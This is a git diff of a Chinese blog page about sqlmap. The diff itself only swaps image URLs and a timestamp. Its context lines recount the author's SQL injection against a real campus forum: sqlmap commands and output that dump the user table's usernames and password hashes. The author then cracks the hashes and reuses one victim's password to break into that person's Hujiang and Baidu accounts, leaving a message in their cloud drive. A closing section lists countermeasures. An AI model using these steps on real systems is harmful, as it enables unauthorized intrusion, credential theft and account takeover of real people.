@@ -95,14 +95,14 @@
 <meta property="og:url" content="https://hsmouc.com/2016/03/06/2016-03-06-sqlmap/index.html">
 <meta property="og:site_name" content="梦的小窝">
 <meta property="og:description" content="sqlmap是一个开源的自动化渗透测试工具，被广泛用于发现SQL注入漏洞。sqlmap的使用几乎毫无技术含量。不过，对于一个杀手来说，他使用的刀只需要保证在任何情况下可靠还有一击毙命即可，至于刀上是否有繁复的装饰和是否仿制都是次要的。sqlmap就是注入的利器，可以高效的审计安全风险。">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/005WMcFzjw1f1op50sejjj31740s4qan.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/005WMcFzjw1f1oplcex63j31700rh7eo.jpg">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/005WMcFzjw1f1opyfcew8j31400cwaen.jpg">
-<meta property="og:updated_time" content="2017-02-02T10:56:28.000Z">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005WMcFzly1fe1b2eq1zrj31740s4qan.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005WMcFzly1fe1b34vfmwj31700rh7eo.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005WMcFzly1fe1b3qr3pkj31400cwaen.jpg">
+<meta property="og:updated_time" content="2017-03-27T04:55:17.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sqlmap部分参数说明">
 <meta name="twitter:description" content="sqlmap是一个开源的自动化渗透测试工具，被广泛用于发现SQL注入漏洞。sqlmap的使用几乎毫无技术含量。不过，对于一个杀手来说，他使用的刀只需要保证在任何情况下可靠还有一击毙命即可，至于刀上是否有繁复的装饰和是否仿制都是次要的。sqlmap就是注入的利器，可以高效的审计安全风险。">
-<meta name="twitter:image" content="http://ww3.sinaimg.cn/large/005WMcFzjw1f1op50sejjj31740s4qan.jpg">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/005WMcFzly1fe1b2eq1zrj31740s4qan.jpg">
 
 
 
@@ -421,13 +421,13 @@
 <p>省略了下面的表信息。<br>我们注意到表中有字段user，我们想知道user中的字段，使用下面的命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; -D bbscore -T user --columns</div></pre></td></tr></table></figure></p>
 <p>得到下面的信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[09:46:22] [INFO] fetching columns for table &apos;user&apos; in database &apos;bbscore&apos;</div><div class="line">[09:46:22] [INFO] resumed: 30</div><div class="line">[09:46:22] [INFO] resumed: id</div><div class="line">[09:46:22] [INFO] resumed: int(10) unsigned</div><div class="line">[09:46:22] [INFO] resumed: username</div><div class="line">[09:46:22] [INFO] resumed: varchar(16)</div><div class="line">[09:46:22] [INFO] resumed: passwd</div><div class="line">[09:46:22] [INFO] resumed: varchar(32)</div><div class="line">[09:46:22] [INFO] resumed: face</div><div class="line">[09:46:22] [INFO] resumed: smallint(6)</div><div class="line">[09:46:22] [INFO] resumed: sex</div><div class="line">[09:46:22] [INFO] resumed: tinyint(4)</div></pre></td></tr></table></figure></p>
 <p>太长没有爆完，因为发现了最感兴趣的username和passwd，最后一步我们直接把username和passwd中的信息dump下来:-)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; -D bbscore -T user -C username,passwd --dump</div></pre></td></tr></table></figure></p>
-<p>附上一张图片吧，这酸爽……<br><img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f1op50sejjj31740s4qan.jpg" alt="screenshot"><br>通过md5在线破解网站获得明文密码:-)</p>
+<p>附上一张图片吧，这酸爽……<br><img src="https://ws1.sinaimg.cn/large/005WMcFzly1fe1b2eq1zrj31740s4qan.jpg" alt="screenshot"><br>通过md5在线破解网站获得明文密码:-)</p>
 <h3 id="意外的惊喜"><a href="#意外的惊喜" class="headerlink" title="意外的惊喜"></a>意外的惊喜</h3><p>你们以为得到这些用户信息就完了吗，那我就不会用sqlmap引发的血案来做标题。我主要是发现了大家的密码习惯非常之糟糕，下面是正文ˊ_&gt;ˋ<br>得到了用户名和密码后黑客完全可以以某个用户的身份登入该bbs发表信息，更改密码，你们以为这样就完了吗？Naive，让我来告诉你们糟糕的习惯和淡薄的网咯安全意识是如何让你的个人资料全面泄漏的。<br>首先在这一堆用户名中我发现了一个很有特色的名字叫tonyxxxxx。(xxxxx是一个单词，被我手动屏蔽，感兴趣的可以看图)原因如下：首先这个名字很独特，不像Jack，Bill这样烂大街；其次这个名字是由tony和xxxxx两个单词组成的，我们可以猜测此用户的英文名为tony，为什么是xxxxx而不是xxxx呢？我猜是因为他曾用tonyxxxx注册过其他的账号发现该昵称已存在，所以使用了tonyxxxxxx这个昵称。根据上面的分析，我们可以获得以下的结论:  </p>
 <ol>
 <li>这个用户名少见，不容易和其他单词混淆</li>
 <li>该用户可能在多处使用了相同用户名  </li>
 </ol>
-<p>下一步就是借助强大的Google查找该用户的踪迹。看截图:<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f1oplcex63j31700rh7eo.jpg" alt=""><br>尝试以该用户的用户名及密码登入沪江英语论坛，成功。<br>发现该用户还用此昵称注册百度账号，尝试以用户名密码登入，成功:-)<br>登入百度账号可以做什么大家可以随意想象，我是不会告诉你们我进了他的度盘给他留了个言的ˊ_&gt;ˋ<br><img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f1opyfcew8j31400cwaen.jpg" alt=""></p>
+<p>下一步就是借助强大的Google查找该用户的踪迹。看截图:<br><img src="https://ws1.sinaimg.cn/large/005WMcFzly1fe1b34vfmwj31700rh7eo.jpg" alt=""><br>尝试以该用户的用户名及密码登入沪江英语论坛，成功。<br>发现该用户还用此昵称注册百度账号，尝试以用户名密码登入，成功:-)<br>登入百度账号可以做什么大家可以随意想象，我是不会告诉你们我进了他的度盘给他留了个言的ˊ_&gt;ˋ<br><img src="https://ws1.sinaimg.cn/large/005WMcFzly1fe1b3qr3pkj31400cwaen.jpg" alt=""></p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个可能是本世纪最低级的黑客行为，但不可否认它是有效的。我们通过分析这次渗透找出应对的措施。  </p>
 <ul>
 <li>该高校校园网存在sql注入漏洞，直接导致大量用户信息泄漏，这是起因。</li>
